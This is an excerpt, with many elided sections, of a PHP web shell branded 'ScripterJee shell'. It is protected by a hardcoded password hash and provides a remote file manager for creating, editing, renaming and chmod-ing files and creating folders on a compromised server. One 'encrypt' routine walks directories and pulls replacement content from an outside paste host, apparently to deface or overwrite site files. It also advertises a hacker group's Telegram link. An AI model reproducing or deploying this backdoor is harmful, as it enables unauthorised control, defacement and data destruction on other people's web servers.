...
/* Configurations */
$aupas      = "5930be75bc2ff13e7a94bcd41dcd7b64";// ScripterJee
...
<html>
  <head>
    ...
    <meta name="author" content="ScripterJee"/>
    <meta name="copyright" content="ScripterJee"/>
    <title>ScripterJee shell</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/0JCTScY/sjee.png"/>
  ...
  <body class="bg-dark text-center text-light">
    ...
    <a href="https://t.me/+AGp0b1bskxI0YzM1" class="text-muted fixed-bottom mb-3">Copyright 2024 @ ScripterJee</a>
  </body>
</html>
<?php
exit;
...
function about(){
  echo '<div class="card text-center bg-light about">
    <h4 class="card-header">ScripterJee</h4>
    <div class="card-body">
      <center><div class="img"></div></center>
      <p class="card-text">ScripterJee We are Indian hacker</p>
    </div>
    <div class="card-footer">
      <small class="card-text text-muted">Copyright 2024 ScripterJee</small>
    </div>
  </div><br/>';
  exit;
}
...
function buatFile($dir,$imgfile){
  echo "<h4>$imgfile Create File :</h4>
  <form method='POST'>
    ...
    <div id='output'></div>
    <textarea name='isi_file' class='form-control' rows='13' placeholder='Enter your Code...'></textarea><br/>
    <input type='submit' class='btn btn-info btn-block' name='bikin' value='Create'>
  </form>";
...
function editFile($dir,$file,$nfile,$imgfile){
  ...
  if(isset($_POST['edit_file'])){
    ...
    if ($hasil){
      $swa = "success";
      $text = "File Update Succeed";
      swall($swa,$text,$dir);
    }else{
      $swa = "error";
      $text = "Fail to Update File";
      swall($swa,$text,$dir);
    }
  }
}
function renameFile($dir,$file,$nfile,$imgfile){
  ...
  if(isset($_POST['rename_file'])){
    ...
    if(file_exists($baru)){
      ...
      if(rename( $lama, $baru)){
        $swa = "success";
        $text = "Name changed Successfully $baru";
        swall($swa,$text,$dir);
      }else{
        $swa = "error";
...
function chmodFolder($dir,$ndir){
  ...
  if(isset($_POST['chmo'])){
    if(@chmod($_GET['dir'],$_POST['perm'])){
      ...
      echo '<font color="white">Failed to change permission </font><br/>';
    }
  }
  exit;
}
function buatFolder($dir,$imgfol){
  ...
  <form method='POST'>
    <div class='input-group'>
      <input type='text' class='form-control' name='nama_folder[]' placeholder='Enter folder name...'>
      <div class='input-group-prepend'>
        <div class='input-group-text'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
      </div>
    </div><br/>
    <div id='output1'></div>
    <input type='submit' class='btn btn-info btn-block' name='buat' value='Create'>
  </form>";
  if (isset($_POST['buat'])){
  ...
  if(isset($_POST["encrypt"])) {
    ...
    function listFolderFiles($dir){
      if (is_dir($dir)) {
        ...
        $index = file_get_contents('https://textbin.sjee.online/raw/4yabgs22gu');
...
<html>
  ...
  <body class="bg-dark text-light">
    ...
    <style>
      ...
      .about .card-body .img{
        position: relative;
        background: url(https://i.ibb.co/Z8tFc1D/sjee.gif);
    ...
    echo '<div class="container">
      <h1 class="text-center"><a href="https://t.me/+AGp0b1bskxI0YzM1" style="color:#ffffff;">ScripterJee</h1>
...
';
          ...
          foreach($scandir as $file){
            ...
            echo '<tr class="text-center">
              ...
              if($ext == "php"){
                echo 'https://i.ibb.co/25JSKRk/337947.png"';
              }elseif ($ext == "html"){
                echo 'https://i.ibb.co/0BfYkLq/html-file-format-3d-rendering-isometric-icon-png.png"';
              }elseif ($ext == "css"){
                echo 'https://i.ibb.co/9HHFW9d/3d-css-file-extension-document-illustration-concept-icon-free-png.png"';
              }elseif ($ext == "png"){
                echo 'https://i.ibb.co/0hvgmPr/images-67-removebg-preview.png"';
              }elseif ($ext == "jpg"){
                echo 'https://i.ibb.co/n74hvQW/760856-jpeg-512x512.png"';
              }elseif ($ext == "jpeg"){
                echo 'http://i.imgur.com/e8mkvPf.png"';
              }elseif($ext == "zip"){
                echo 'https://i.ibb.co/VVVwTqf/zip-file-format-3d-rendering-isometric-icon-png.png"';
              }elseif ($ext == "js"){
                echo 'https://i.ibb.co/n3PNT1c/js-file-format-3d-rendering-isometric-icon-png.png';
              }elseif ($ext == "ttf"){
                echo 'https://i.ibb.co/ZfN9yq0/ttf-font-file-file-type-icon-files-format-and-document-concept-3d-render-illustration-png.png';
              }elseif ($ext == "otf"){
                echo 'https://i.ibb.co/xqvG2BB/File-type-Extension-112-512.png';
              }elseif ($ext == "txt"){
                echo 'https://i.ibb.co/kStMGpv/3d-txt-file-extension-document-illustration-concept-icon-free-png.png';
              }elseif ($ext == "ico"){
                echo 'https://i.ibb.co/MSxFHjx/ico-512.png';
              }elseif ($ext == "conf"){
                echo 'https://i.ibb.co/nwZXvh6/File-type-Extension-124-512.png';
              }elseif ($ext == "htaccess"){
                echo 'https://i.ibb.co/ZBDdndq/images-38.jpg';
              }elseif ($ext == "sh"){
                echo 'https://i.ibb.co/M85DVVm/File-type-Extension-148-512.png';
              }elseif ($ext == "py"){
                echo 'https://i.ibb.co/9cpXpqC/images-159.jpg';
              }elseif ($ext == "indsc"){
                ...
                echo 'https://i.ibb.co/n6nD7SF/images-49.jpg';
              }elseif ($ext == "mp4"){
                echo 'https://i.ibb.co/LvJQ0zG/3d-mp4-file-icon-illustration-png.png';
              }elseif ($ext == "mp3"){
                echo 'https://i.ibb.co/vkn7wgx/5790042.png';
              }elseif ($ext == "git"){
                echo 'https://i.ibb.co/fq38Drj/images-30.png';
              }elseif ($ext == "md"){
        ...
        echo '</table></div><hr/>
        <center><a class="text-muted" href="https://t.me/+AGp0b1bskxI0YzM1">Copyright 2024 ScripterJee</a></center><br/>';  
